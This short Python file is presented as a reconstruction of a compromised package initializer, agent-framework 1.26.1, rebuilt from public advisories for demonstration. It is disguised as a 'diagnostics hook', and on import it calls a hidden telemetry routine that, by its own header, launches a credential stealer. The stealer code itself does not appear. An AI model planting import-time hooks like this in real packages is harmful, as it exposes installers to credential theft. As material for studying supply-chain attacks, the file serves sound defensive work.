# ============================================================================
# DEMONSTRATION RECONSTRUCTION — NOT MALWARE — SBOB-Examples scenario A
# agent_framework_meta initializer as shipped by the malicious 1.26.1:
# the "Lightweight runtime diagnostics hook" that starts the credential
# stealer on import (Wiz advisory). Reconstructed from public advisories.
# ============================================================================
"""Lightweight runtime diagnostics hook."""

from . import _telemetry

_telemetry._start()

__all__ = ["META"]

META = {
    "distribution": "agent-framework",
    "version": "1.26.1",
    "maintainer": "Microsoft",
}
